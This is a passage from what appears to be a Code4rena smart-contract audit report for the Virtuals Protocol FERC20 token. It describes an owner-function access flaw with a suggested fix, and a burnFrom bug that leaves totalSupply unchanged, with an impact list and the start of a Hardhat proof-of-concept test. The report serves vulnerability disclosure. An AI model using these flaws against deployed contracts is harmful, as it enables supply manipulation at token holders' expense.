href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description and Impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eFERC20\u003c/code\u003e contract, there are two functions restricted to be called only by the owner of the token: \u003ccode\u003eupdateMaxTx\u003c/code\u003e and \u003ccode\u003eexcludeFromMaxTx\u003c/code\u003e. These functions are crucial for managing transaction limits and exclusions for specific addresses. However, an issue arises as the owner of the token is the \u003ccode\u003eBonding\u003c/code\u003e contract, which does not expose these functions externally. As a result, no one can call these functions, preventing the update of transaction limits or exclusions.\u003c/p\u003e\n\u003cp\u003eHere is the relevant code snippet from the contract:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ERC20: Exclude Max Tx from the zero address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisExcludedFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact:\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eTransaction Limit Issues:\u003c/strong\u003e The inability to update the maximum transaction limit leaves the contract inflexible in adapting to changes in market conditions or governance decisions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExclusion Issues:\u003c/strong\u003e Certain addresses that should be exempt from transaction limits cannot be excluded, limiting the ability to manage token holders effectively.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eModify the \u003ccode\u003eBonding\u003c/code\u003e contract to include wrapper functions that externally call \u003ccode\u003eupdateMaxTx\u003c/code\u003e and \u003ccode\u003eexcludeFromMaxTx\u003c/code\u003e for the owner. This ensures these functions are accessible for updates and exclusions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTxForOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTxForOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\" aria-label=\"m 10 missing totalsupply reduction in burnfrom allows supply manipulation erc20 violation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-41\"\u003e[M-10] Missing \u003ccode\u003etotalSupply\u003c/code\u003e reduction in \u003ccode\u003eburnFrom\u003c/code\u003e allows supply manipulation (ERC20 Violation)\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-56\"\u003eAgrawain\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-542\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-607\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-218\"\u003ecerweb10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-450\"\u003eCompetSlayer\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-716\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-777\"\u003eedoscoba\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-425\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-825\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-754\"\u003eSilverwind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-670\"\u003eunique\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-686\"\u003eX-Tray03\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-5\" aria-label=\"finding description 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eburnFrom\u003c/code\u003e (address user, uint256 amount) function in the FERC20 contract allows the owner to decrease a user’s balance and emit a Transfer (user, \u003ccode\u003eaddress(0)\u003c/code\u003e, amount) event — simulating a burn. However, it fails to reduce the \u003ccode\u003e_totalSupply\u003c/code\u003e variable. This violates the ERC20 standard and creates an inconsistency between on-chain total supply and actual circulating tokens.\u003c/p\u003e\n\u003ch3 id=\"impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis vulnerability has significant consequences:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eERC20 Standard Violation:\u003c/strong\u003e Tools, protocols, and dApps relying on \u003ccode\u003etotalSupply()\u003c/code\u003e will receive incorrect data.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMarket Cap Manipulation:\u003c/strong\u003e Since market cap is often calculated as \u003ccode\u003eprice * totalSupply\u003c/code\u003e, an attacker can make the market cap appear larger than reality, misleading investors and platforms.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDeFi Exploits:\u003c/strong\u003e Protocols that distribute rewards or voting power proportionally to \u003ccode\u003etotalSupply\u003c/code\u003e or \u003ccode\u003ebalance/totalSupply\u003c/code\u003e ratios may be gamed.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFalse Burn Signals:\u003c/strong\u003e The Transfer event to the zero address signals a burn, while the tokens still exist in the \u003ccode\u003etotalSupply\u003c/code\u003e, creating a false narrative of scarcity.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCentralization Risk:\u003c/strong\u003e The owner can arbitrarily remove user balances (burn) while keeping \u003ccode\u003etotalSupply\u003c/code\u003e unchanged, retaining apparent token value but harming users.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis combination creates both economic manipulation risk and false transparency, which can impact DeFi, governance, analytics, and user trust.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-11\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Run Test\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003enpx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ehardhat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexploits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ejs\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// POC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan 